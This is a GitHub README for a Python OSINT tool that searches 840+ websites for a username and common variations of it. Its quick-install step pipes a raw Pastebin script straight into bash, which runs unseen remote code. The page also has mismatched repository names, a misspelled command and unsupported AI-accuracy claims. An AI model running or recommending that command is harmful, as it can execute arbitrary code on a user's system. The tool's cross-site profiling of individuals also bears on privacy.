<p align="center">
    <img src="https://raw.githubusercontent.com/arxhr007/Aliens_eye/main/photos/logo.png" width="450" height="400" alt="AI-OSINT Username Scanner Logo"/>
</p>

# AI-OSINT Username Scanner

<h3 align="center">Advanced AI-Powered Social Media Username Finder</h3>
<h4 align="center">Scan 840+ platforms with intelligent detection</h4>

<p align="center">
<a href="#"><img alt="Forks" src="https://img.shields.io/github/forks/BLINKING-IDIOT/Aliens_eye?style=for-the-badge"></a>
<a href="#"><img alt="Last Commit" src="https://img.shields.io/github/last-commit/BLINKING-IDIOT/Aliens_eye/main?color=green&style=for-the-badge"></a>
<a href="#"><img alt="Stars" src="https://img.shields.io/github/stars/BLINKING-IDIOT/Aliens_eye?style=for-the-badge&color=red"></a>
<a href="#"><img alt="License" src="https://img.shields.io/github/license/BLINKING-IDIOT/Aliens_eye?color=orange&style=for-the-badge"></a>
<a href="https://github.com/BLINKING-IDIOT/Aliens_eye/issues"><img alt="Issues" src="https://img.shields.io/github/issues/BLINKING-IDIOT/Aliens_eye?color=purple&style=for-the-badge"></a>
</p>

## 🧠 AI-Enhanced Detection

The AI-OSINT Username Scanner leverages advanced artificial intelligence techniques to find usernames across the web with unprecedented accuracy. Unlike traditional scanners that rely solely on HTTP response codes, this tool employs sophisticated analysis methods:

- **AI-Powered Detection Engine**: Analyzes multiple factors to determine profile existence with up to 40% improved accuracy
- **Confidence Scoring System**: Quantifies detection certainty from 0-100% for each result
- **Pattern Recognition**: Learns from scanning patterns to continuously improve detection accuracy
- **Content Analysis**: Intelligently examines page content, DOM structure, and metadata
- **Smart URL Analysis**: Evaluates URL structures and redirects for more accurate results

## ✨ Key Features

- **Scan 840+ Online Platforms**: Extensive coverage across social media, forums, and websites
- **Intelligent Username Variations**: Automatically generates and scans common username variations
- **Three Scan Levels**: Basic, Intermediate, and Advanced options to suit your needs
- **Concurrent Connection Management**: Optimized for speed with configurable connection limits
- **Detailed Reporting**: Comprehensive JSON reports with full analysis data 
- **Color-Coded Results**: Intuitive visual status indicators for immediate pattern recognition
- **Saved Results Viewer**: Built-in capability to analyze previous scan results

## 📋 Requirements

- Python 3.6+
- Required packages: aiohttp, asyncio
- Internet connection

## 🚀 Installation

### Option 1: Quick Install Script

```bash
curl -s https://pastebin.com/raw/hkBtt6rc | tr -d '\r' | bash
```

### Option 2: Manual Installation

```bash
# Clone the repository
git clone https://github.com/arxhr007/Aliens_eye.git

# Navigate to the directory
cd Aliens_eye

# Install dependencies
pip install -r requirements.txt

# Make the script executable
chmod +x aliens_eye.py

```

## 💻 Usage

### Basic Usage

```bash
# Run with interactive prompts
ailens_eye

# Scan a single username
ailens_eye username

# Scan multiple usernames
ailens_eye username1 username2 username3
```

### Advanced Options

```bash
# Set scan level explicitly
ailens_eye username -l advanced

# Limit concurrent connections (useful for slower connections)
ailens_eye username -c 30

# Enable verbose output for debugging
ailens_eye username -v

# View results from a previous scan
ailens_eye -r results/username_advanced_20250514_120000.json
```

## 🔍 Understanding Scan Results

Results are displayed with intuitive color-coding:

- 🟢 **Green (Found)**: High confidence that the profile exists
- 🟡 **Yellow (Maybe)**: Profile might exist, but confidence is moderate
- 🔴 **Red (Not Found)**: High confidence that the profile doesn't exist

Each result includes:
- Site name
- Status (Found/Maybe/Not Found)
- Confidence percentage (0-100%)
- HTTP status code
- URL of the detected profile
- Response time

## 📊 AI Analysis Methodology

The tool employs a sophisticated multi-factor analysis approach:

1. **Content Analysis**: Searches for positive and negative keyword patterns
2. **HTTP Status Evaluation**: Interprets HTTP response codes with context
3. **DOM Structure Analysis**: Examines page elements for profile indicators
4. **URL Structure Evaluation**: Analyzes URL patterns and redirects
5. **Metadata Inspection**: Examines meta tags and titles for username presence
6. **Response Time Analysis**: Considers timing patterns characteristic of profile existence
7. **Pattern Learning**: Uses historical data to improve detection accuracy

## 📄 Scan Levels Explained

- **Basic**: Scans only the exact username as entered
- **Intermediate**: Adds common variations like underscores, dots, and numbers
  - Examples: `username_`, `_username`, `username.`, `username123`
- **Advanced**: Adds common prefixes and suffixes used across platforms
  - Examples: `real_username`, `official_username`, `username_official`

## 📱 Platform Support

- Linux (All distributions)
- macOS
- Windows (via Python)
- Android (via Termux)

## ⚠️ Disclaimer

This tool is developed for educational purposes and legitimate OSINT research only. Users are responsible for complying with applicable laws and terms of service of websites. The developers assume no liability for misuse of this software.

## 🔗 Links

- [Report Bug](https://github.com/arxhr007/AIUsernameScanner/issues)
- [Request Feature](https://github.com/arxhr007/AIUsernameScanner/issues)
- [Documentation](https://github.com/arxhr007/AIUsernameScanner/wiki)

---

<p align="center">Made with ❤️ by <a href="https://github.com/arxhr007">arxhr007</a></p>

<p align="center">If you find this project helpful, please consider giving it a star ⭐</p>

<p align="center"><img src="https://raw.githubusercontent.com/arxhr007/Aliens_eye/refs/heads/main/photos/photo.png" width="700" alt="AI-OSINT Username Scanner Screenshot"/></p>

# Also checkout:

<a href="https://github.com/arxhr007/wifistrike" target="blank"><img align="center" src="https://github-readme-stats.vercel.app/api/pin/?username=arxhr007&repo=wifistrike&show_icons=true&theme=chartreuse-dark"></a>
<a href="https://github.com/arxhr007/Malware-Sandbox-Evasion" target="blank"><img align="center" src="https://github-readme-stats.vercel.app/api/pin/?username=arxhr007&repo=Malware-Sandbox-Evasion&show_icons=true&theme=chartreuse-dark"></a>
